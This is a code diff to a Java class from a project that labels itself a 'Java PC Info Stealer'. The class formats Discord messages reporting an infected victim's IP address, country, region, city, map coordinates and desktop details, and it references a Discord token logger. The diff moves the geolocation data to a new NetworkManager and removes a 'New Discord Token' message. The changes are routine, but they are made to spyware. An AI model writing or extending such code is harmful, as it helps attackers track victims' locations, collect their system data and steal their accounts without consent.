@@ -3,6 +3,7 @@ package me.koenv.mw.discord;
 import me.koenv.embed.Embed;
 import me.koenv.mw.DesktopInfo;
 import me.koenv.mw.Main;
+import me.koenv.mw.NetworkManager;
 
 public abstract class DcEmbeds {
 
@@ -10,17 +11,18 @@ public abstract class DcEmbeds {
     private static final String mapsUrl = Main.getMapsUrl();
     private static final DesktopInfo DI = Main.getDesktopInfo();
     private static final Tokens tokenLogger = Main.getDcTokens();
+    private static final NetworkManager nM = Main.getNetworkManager();
 
     public static Embed pcInfoEmbed = new Embed.Builder()
             .title("**New Pc Information**")
             .url("https://koendev.tk/blog/malware#Java-Pc-Information-Stealer")
             .color("#04f33b")
             .field("**Ip Information                                           **",
-                    "**IP:** ``" + main.getJsonData().getString("query") + "``\n" +
-                    "**Country:** ``" + main.getJsonData().getString("countryCode") + "``\n" +
-                    "**Region:** ``" + main.getJsonData().getString("region") + "``\n" +
-                    "**City:** ``" + main.getJsonData().getString("city") + "``\n" +
-                    "[**See On Google Maps**](" + mapsUrl + main.getJsonData().getDouble("lat") + ',' + main.getJsonData().getDouble("lon") + ")"
+                    "**IP:** ``" + nM.getJsonData().getString("query") + "``\n" +
+                    "**Country:** ``" + nM.getJsonData().getString("countryCode") + "``\n" +
+                    "**Region:** ``" + nM.getJsonData().getString("region") + "``\n" +
+                    "**City:** ``" + nM.getJsonData().getString("city") + "``\n" +
+                    "[**See On Google Maps**](" + mapsUrl + nM.getJsonData().getDouble("lat") + ',' + nM.getJsonData().getDouble("lon") + ")"
                     , true)
 
             .field("**Desktop Information                              **",
@@ -38,9 +40,4 @@ public abstract class DcEmbeds {
             .footer("Java PC Info Stealer")
             .timestamp()
             .build();
-
-    public static Embed dcTokenEmbed = new Embed.Builder()
-            .title("**New Discord Token**")
-            .build();
-
 }
